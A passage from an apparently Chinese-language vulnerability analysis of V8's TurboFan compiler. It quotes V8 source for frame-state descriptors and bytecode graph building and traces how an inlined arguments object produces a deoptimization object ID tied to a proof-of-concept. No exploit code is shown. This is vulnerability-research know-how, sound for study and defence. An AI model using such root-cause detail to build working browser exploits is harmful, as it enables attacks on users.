</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// Deoptimizer counts duplicate objects for the running id, so we have
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// to push the input again.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        deduplicator<span style="color:#f92672">-&gt;</span>InsertObject(input);
</span></span><span style="display:flex;"><span>        values<span style="color:#f92672">-&gt;</span>PushDuplicate(id);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>StateValueList<span style="color:#f92672">*</span> <span style="color:#a6e22e">PushRecursiveField</span>(Zone<span style="color:#f92672">*</span> zone, size_t id) {
</span></span><span style="display:flex;"><span>	fields_.push_back(StateValueDescriptor<span style="color:#f92672">::</span>Recursive(id));
</span></span><span style="display:flex;"><span>	StateValueList<span style="color:#f92672">*</span> nested <span style="color:#f92672">=</span> zone<span style="color:#f92672">-&gt;</span>New<span style="color:#f92672">&lt;</span>StateValueList<span style="color:#f92672">&gt;</span>(zone);
</span></span><span style="display:flex;"><span>	nested_.push_back(nested);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> nested;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> StateValueDescriptor <span style="color:#a6e22e">Recursive</span>(size_t id) {
</span></span><span style="display:flex;"><span>	StateValueDescriptor descr(StateValueKind<span style="color:#f92672">::</span>kNested,
</span></span><span style="display:flex;"><span>							   MachineType<span style="color:#f92672">::</span>AnyTagged());
</span></span><span style="display:flex;"><span>	descr.id_ <span style="color:#f92672">=</span> id;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> descr;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>当 input 节点类型为 <code>kTypedObjectState</code> 时, 先向 values 中存入的描述符 <code>kNested</code>, 之后将节点的 input 依次存入 values 和 inputs 中。结合上面的的堆栈恢复代码，可以知道这里会存储对象的 Map, property, elements 等域。</p>
<p>input 来自 FrameState 节点中存储的参数信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>size_t InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>    StateValueList<span style="color:#f92672">*</span> values, InstructionOperandVector<span style="color:#f92672">*</span> inputs,
</span></span><span style="display:flex;"><span>    OperandGenerator<span style="color:#f92672">*</span> g, StateObjectDeduplicator<span style="color:#f92672">*</span> deduplicator, Node<span style="color:#f92672">*</span> node,
</span></span><span style="display:flex;"><span>    FrameStateInputKind kind, Zone<span style="color:#f92672">*</span> zone) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    StateValuesAccess<span style="color:#f92672">::</span>iterator it <span style="color:#f92672">=</span> StateValuesAccess(node).begin();
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Take advantage of sparse nature of StateValuesAccess to skip over
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// multiple empty nodes at once pushing repeated OptimizedOuts all in one
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// go.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>it.done()) {
</span></span><span style="display:flex;"><span>      values<span style="color:#f92672">-&gt;</span>PushOptimizedOut(it.AdvanceTillNotEmpty());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (it.done()) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      StateValuesAccess<span style="color:#f92672">::</span>TypedNode input_node <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>it;
</span></span><span style="display:flex;"><span>      entries <span style="color:#f92672">+=</span> AddOperandToStateValueDescriptor(values, inputs, g,
</span></span><span style="display:flex;"><span>                                                  deduplicator, input_node.node,
</span></span><span style="display:flex;"><span>                                                  input_node.type, kind, zone);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">++</span>it;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> entries;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Returns the number of instruction operands added to inputs.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>size_t InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>    FrameStateDescriptor<span style="color:#f92672">*</span> descriptor, FrameState state, OperandGenerator<span style="color:#f92672">*</span> g,
</span></span><span style="display:flex;"><span>    StateObjectDeduplicator<span style="color:#f92672">*</span> deduplicator, InstructionOperandVector<span style="color:#f92672">*</span> inputs,
</span></span><span style="display:flex;"><span>    FrameStateInputKind kind, Zone<span style="color:#f92672">*</span> zone) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> parameters <span style="color:#f92672">=</span> state.parameters();
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  StateValueList<span style="color:#f92672">*</span> values_descriptor <span style="color:#f92672">=</span> descriptor<span style="color:#f92672">-&gt;</span>GetStateValueDescriptors();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_EQ(values_descriptor<span style="color:#f92672">-&gt;</span>size(), <span style="color:#ae81ff">0u</span>);
</span></span><span style="display:flex;"><span>  values_descriptor<span style="color:#f92672">-&gt;</span>ReserveSize(descriptor<span style="color:#f92672">-&gt;</span>GetSize());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 处理参数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  entries <span style="color:#f92672">+=</span> AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>      values_descriptor, inputs, g, deduplicator, parameters, kind, zone); <span style="color:#75715e">// &lt;&lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> InstructionSelector<span style="color:#f92672">::</span>AppendDeoptimizeArguments(
</span></span><span style="display:flex;"><span>    InstructionOperandVector<span style="color:#f92672">*</span> args, DeoptimizeKind kind,
</span></span><span style="display:flex;"><span>    DeoptimizeReason reason, NodeId node_id, FeedbackSource <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> feedback,
</span></span><span style="display:flex;"><span>    FrameState frame_state) {
</span></span><span style="display:flex;"><span>  OperandGenerator <span style="color:#a6e22e">g</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  FrameStateDescriptor<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> descriptor <span style="color:#f92672">=</span> GetFrameStateDescriptor(frame_state);
</span></span><span style="display:flex;"><span>  DCHECK_NE(DeoptimizeKind<span style="color:#f92672">::</span>kLazy, kind);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">const</span> state_id <span style="color:#f92672">=</span> sequence()<span style="color:#f92672">-&gt;</span>AddDeoptimizationEntry(
</span></span><span style="display:flex;"><span>      descriptor, kind, reason, node_id, feedback);
</span></span><span style="display:flex;"><span>  args<span style="color:#f92672">-&gt;</span>push_back(g.TempImmediate(state_id));
</span></span><span style="display:flex;"><span>  StateObjectDeduplicator <span style="color:#a6e22e">deduplicator</span>(instruction_zone());
</span></span><span style="display:flex;"><span>  AddInputsToFrameStateDescriptor(descriptor, frame_state, <span style="color:#f92672">&amp;</span>g, <span style="color:#f92672">&amp;</span>deduplicator,
</span></span><span style="display:flex;"><span>                                  args, FrameStateInputKind<span style="color:#f92672">::</span>kAny,
</span></span><span style="display:flex;"><span>                                  instruction_zone()); <span style="color:#75715e">// &lt;&lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// TODO(bmeurer): Get rid of the CallBuffer business and make
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// InstructionSelector::VisitCall platform independent instead.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> InstructionSelector<span style="color:#f92672">::</span>InitializeCallBuffer(Node<span style="color:#f92672">*</span> call, CallBuffer<span style="color:#f92672">*</span> buffer,
</span></span><span style="display:flex;"><span>                                               CallBufferFlags flags,
</span></span><span style="display:flex;"><span>                                               <span style="color:#66d9ef">int</span> stack_param_delta) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// If the call needs a frame state, we insert the state information as
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// follows (n is the number of value inputs to the frame state):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// arg 1               : deoptimization id.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// arg 2 - arg (n + 2) : value inputs to the frame state.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  size_t frame_state_entries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  USE(frame_state_entries);  <span style="color:#75715e">// frame_state_entries is only used for debug.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (buffer<span style="color:#f92672">-&gt;</span>frame_state_descriptor <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>    FrameState frame_state{
</span></span><span style="display:flex;"><span>        call<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(buffer<span style="color:#f92672">-&gt;</span>descriptor<span style="color:#f92672">-&gt;</span>InputCount()))};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">const</span> state_id <span style="color:#f92672">=</span> sequence()<span style="color:#f92672">-&gt;</span>AddDeoptimizationEntry(
</span></span><span style="display:flex;"><span>        buffer<span style="color:#f92672">-&gt;</span>frame_state_descriptor, DeoptimizeKind<span style="color:#f92672">::</span>kLazy,
</span></span><span style="display:flex;"><span>        DeoptimizeReason<span style="color:#f92672">::</span>kUnknown, call<span style="color:#f92672">-&gt;</span>id(), FeedbackSource());
</span></span><span style="display:flex;"><span>    buffer<span style="color:#f92672">-&gt;</span>instruction_args.push_back(g.TempImmediate(state_id));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    StateObjectDeduplicator <span style="color:#a6e22e">deduplicator</span>(instruction_zone());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    frame_state_entries <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>                buffer<span style="color:#f92672">-&gt;</span>frame_state_descriptor, frame_state, <span style="color:#f92672">&amp;</span>g, <span style="color:#f92672">&amp;</span>deduplicator,
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>buffer<span style="color:#f92672">-&gt;</span>instruction_args, FrameStateInputKind<span style="color:#f92672">::</span>kStackSlot,
</span></span><span style="display:flex;"><span>                instruction_zone()); <span style="color:#75715e">// &lt;&lt;&lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    DCHECK_EQ(<span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> frame_state_entries, buffer<span style="color:#f92672">-&gt;</span>instruction_args.size());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> InstructionSelector<span style="color:#f92672">::</span>VisitCall(Node<span style="color:#f92672">*</span> node, BasicBlock<span style="color:#f92672">*</span> handler) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  CallBuffer buffer(zone(), call_descriptor, frame_state_descriptor);
</span></span><span style="display:flex;"><span>  CallDescriptor<span style="color:#f92672">::</span>Flags flags <span style="color:#f92672">=</span> call_descriptor<span style="color:#f92672">-&gt;</span>flags();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Compute InstructionOperands for inputs and outputs.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// TODO(turbofan): on some architectures it&#39;s probably better to use
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the code object in a register if there are multiple uses of it.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// Improve constant pool and the heuristics in the register allocator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// for where to emit constants.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  CallBufferFlags <span style="color:#a6e22e">call_buffer_flags</span>(kCallCodeImmediate <span style="color:#f92672">|</span> kCallAddressImmediate);
</span></span><span style="display:flex;"><span>  InitializeCallBuffer(node, <span style="color:#f92672">&amp;</span>buffer, call_buffer_flags); <span style="color:#75715e">//&lt;&lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>FrameState 节点是 <code>BytecodeGraphBuilder</code> 在生成 turbofan 图 IR 时创建的，用 <a href="https://v8.github.io/tools/head/turbolizer/index.html">turbolizer</a> 打开 turbofan 输出的 trace 文件，从后往前分析 IR 后发现，<code>kObjectId</code> 节点对应的是 <code>b.a.call(arguments,b)</code> 函数调用的 FrameState 中的 receiver 参数</p>
<p>![[Pasted image 20230811003541.png]]
kObjectId 节点是在 EscapeAnalysis 阶段创建的
![[Pasted image 20230811003746.png]]</p>
<p>再看一下 EscapeAnalysis 之前的 LoadElimination 阶段, 对应的位置是一个 kFinishRegion 节点，浏览相关代码后得知这个节点是 <code>AllocationBuilder</code> 创建的，是一系列对象创建操作的结尾，结合 POC 源码推测，这里代表的是 arguments 对象的创建。</p>
<p>![[Pasted image 20230811005830.png]]</p>
<p>再往前追溯到 Typer 阶段，发现这里变成了 JSCrateArguments 节点，就刚好可以证实之前的推测。</p>
<p>![[Pasted image 20230814232830.png]]</p>
<p>再往前追溯，下次变化在 BytecodeGraphBuilder 阶段，这个是因为紧随其后的 Inlining 阶段把 JSCall</p>
<p>![[Pasted image 20230815221029.png]]</p>
<p>从 turbofan 的源码视图也可以看出来两个子函数都被 inline 进了最外层的函数</p>
<p>![[Pasted image 20230815221141.png]]</p>
<p>在选定好 inline 的目标后，是在 <code>JSInliner::ReduceJSCall(Node* node)</code> 函数中完成实际的 inline 操作。主要是创建子函数的 IR 图，之后把它连接到父函数的 IR 图中。连接过程从，有两个操作引起了我的注意：</p>
<ul>
<li>用调用点 (JSCall节点) 的 FrameState 替换子函数内部的 FrameState 的 outer_frame_state 输入</li>
<li>用调用点 (JSCall节点) 的实参 (inputs) 替代子函数的 形参 (Parameters) 节点</li>
</ul>
<p>了解了这些再来仔细看下 inline 之后的情况</p>
<p>![[Pasted image 20230816004600.png]]</p>
<p>此时这个 JSCall 对应的已经是 a.b(0, a) 这个函数调用, 所以这个 FrameState 对应的是</p>
<pre tabindex="0"><code>(a) {
    a.b(0, a)
}
</code></pre><p>这个函数的参数是 <code>b.a.call(arguments, b)</code> 调用传递的，
this =&gt; arguments，所以图中是一个 JSCreateArguments 节点
parameter1 =&gt; b，再往上追溯到 <code>b.d(a, b, 1)</code> 中的 b, 最终追溯到最外层函数的第二个参数 <code>b</code>, 所以图中是 Parameter[2]，代表是最外层函数的第二个参数。</p>
<p>还要注意下 102: FrameState 这个节点，它是 134:FrameState 的 outer_frame, 也就是 <code>b.a.call(arguments, b)</code> 这个调用处的 FrameState，可以看到 JSCreateArguments 节点也是 102 这个 FrameState 的局部变量，这个信息对触发漏洞也很重要。</p>
<p>这里再简单说一下 FrameState 节点的创建，最初的 FrameState 节点是在从字节码创建图 IR 时按需调用 <code>Checkpoint()</code> 创建的，每个 FrameState 节点都代表着当前位置的栈状态，存储着当前函数的参数，局部变量，this, context 等信息。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Node<span style="color:#f92672">*</span> BytecodeGraphBuilder<span style="color:#f92672">::</span>Environment<span style="color:#f92672">::</span>Checkpoint(
</span></span><span style="display:flex;"><span>    BytecodeOffset bailout_id, OutputFrameStateCombine combine,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> BytecodeLivenessState<span style="color:#f92672">*</span> liveness) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (parameter_count() <span style="color:#f92672">==</span> register_count()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Re-use the state-value cache if the number of local registers happens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// to match the parameter count.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    parameters_state_values_ <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        GetStateValuesFromCache(<span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(<span style="color:#ae81ff">0</span>), parameter_count(), <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    UpdateStateValues(<span style="color:#f92672">&amp;</span>parameters_state_values_, <span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>                      parameter_count());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> registers_state_values <span style="color:#f92672">=</span> GetStateValuesFromCache(
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(register_base()), register_count(), liveness);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> accumulator_is_live <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>liveness <span style="color:#f92672">||</span> liveness<span style="color:#f92672">-&gt;</span>AccumulatorIsLive();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> accumulator_state_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      accumulator_is_live <span style="color:#f92672">&amp;&amp;</span> combine <span style="color:#f92672">!=</span> OutputFrameStateCombine<span style="color:#f92672">::</span>PokeAt(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">?</span> values()<span style="color:#f92672">-&gt;</span>at(accumulator_base())
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">:</span> builder()<span style="color:#f92672">-&gt;</span>jsgraph()<span style="color:#f92672">-&gt;</span>OptimizedOutConstant();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> Operator<span style="color:#f92672">*</span> op <span style="color:#f92672">=</span> common()<span style="color:#f92672">-&gt;</span>FrameState(
</span></span><span style="display:flex;"><span>      bailout_id, combine, builder()<span style="color:#f92672">-&gt;</span>frame_state_function_info());
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> result <span style="color:#f92672">=</span> graph()<span style="color:#f92672">-&gt;</span>NewNode(
</span></span><span style="display:flex;"><span>      op, parameters_state_values_, registers_state_values,
</span></span><span style="display:flex;"><span>      accumulator_state_value, Context(), builder()<span style="color:#f92672">-&gt;</span>GetFunctionClosure(),
</span></span><span style="display:flex;"><span>      builder()<span style="color:#f92672">-&gt;</span>graph()<span style="color:#f92672">-&gt;</span>start());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Issues:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Scopes - intimately tied to AST. Need to eval what is needed.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Need to resolve closure parameter treatment.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BytecodeGraphBuilder<span style="color:#f92672">::</span>Environment<span style="color:#f92672">::</span>Environment(
</span></span><span style="display:flex;"><span>    BytecodeGraphBuilder<span style="color:#f92672">*</span> builder, <span style="color:#66d9ef">int</span> register_count, <span style="color:#66d9ef">int</span> parameter_count,
</span></span><span style="display:flex;"><span>    interpreter<span style="color:#f92672">::</span>Register incoming_new_target_or_generator,
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> control_dependency)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> builder_(builder),
</span></span><span style="display:flex;"><span>      register_count_(register_count),
</span></span><span style="display:flex;"><span>      parameter_count_(parameter_count),
</span></span><span style="display:flex;"><span>      control_dependency_(control_dependency),
</span></span><span style="display:flex;"><span>      effect_dependency_(control_dependency),
</span></span><span style="display:flex;"><span>      values_(builder<span style="color:#f92672">-&gt;</span>local_zone()),
</span></span><span style="display:flex;"><span>      parameters_state_values_(<span style="color:#66d9ef">nullptr</span>),
</span></span><span style="display:flex;"><span>      generator_state_(<span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// The layout of values_ is:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// [receiver] [parameters] [registers] [accumulator]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// parameter[0] is the receiver (this), parameters 1..N are the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// parameters supplied to the method (arg0..argN-1). The accumulator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// is stored separately.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Parameters including the receiver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> parameter_count; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> debug_name <span style="color:#f92672">=</span> (i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;%this&#34;</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">nullptr</span>;
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> parameter <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>GetParameter(i, debug_name);
</span></span><span style="display:flex;"><span>    values()<span style="color:#f92672">-&gt;</span>push_back(parameter);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Registers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  register_base_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(values()<span style="color:#f92672">-&gt;</span>size());
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> undefined_constant <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>jsgraph()<span style="color:#f92672">-&gt;</span>UndefinedConstant();
</span></span><span style="display:flex;"><span>  values()<span style="color:#f92672">-&gt;</span>insert(values()<span style="color:#f92672">-&gt;</span>end(), register_count, undefined_constant);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Accumulator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  accumulator_base_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(values()<span style="color:#f92672">-&gt;</span>size());
</span></span><span style="display:flex;"><span>  values()<span style="color:#f92672">-&gt;</span>push_back(undefined_constant);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Context
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> context_index <span style="color:#f92672">=</span> Linkage<span style="color:#f92672">::</span>GetJSCallContextParamIndex(parameter_count);
</span></span><span style="display:flex;"><span>  context_ <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>GetParameter(context_index, <span style="color:#e6db74">&#34;%context&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Incoming new.target or generator register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (incoming_new_target_or_generator.is_valid()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> new_target_index <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        Linkage<span style="color:#f92672">::</span>GetJSCallNewTargetParamIndex(parameter_count);
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> new_target_node <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        builder<span style="color:#f92672">-&gt;</span>GetParameter(new_target_index, <span style="color:#e6db74">&#34;%new.target&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> values_index <span style="color:#f92672">=</span> RegisterToValuesIndex(incoming_new_target_or_generator);
</span></span><span style="display:flex;"><span>    values()<span style="color:#f92672">-&gt;</span>at(values_index) <span style="color:#f92672">=</span> new_target_node;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Node<span style="color:#f92672">*</span> BytecodeGraphBuilder<span style="color:#f92672">::</span>GetParameter(<span style="color:#66d9ef">int</span> parameter_index,
</span></span><span style="display:flex;"><span>                                         <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> debug_name_hint) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// We use negative indices for some parameters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK_LE(ParameterInfo<span style="color:#f92672">::</span>kMinIndex, parameter_index);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> size_t index <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>size_t<span style="color:#f92672">&gt;</span>(parameter_index <span style="color:#f92672">-</span> ParameterInfo<span style="color:#f92672">::</span>kMinIndex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cached_parameters_.size() <span style="color:#f92672">&lt;=</span> index) {
</span></span><span style="display:flex;"><span>    cached_parameters_.resize(index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cached_parameters_[index] <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>    cached_parameters_[index] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        NewNode(common()<span style="color:#f92672">-&gt;</span>Parameter(parameter_index, debug_name_hint),
</span></span><span style="display:flex;"><span>                graph()<span style="color:#f92672">-&gt;</span>start());
</span></span><span style="display:flex;"><span>  }
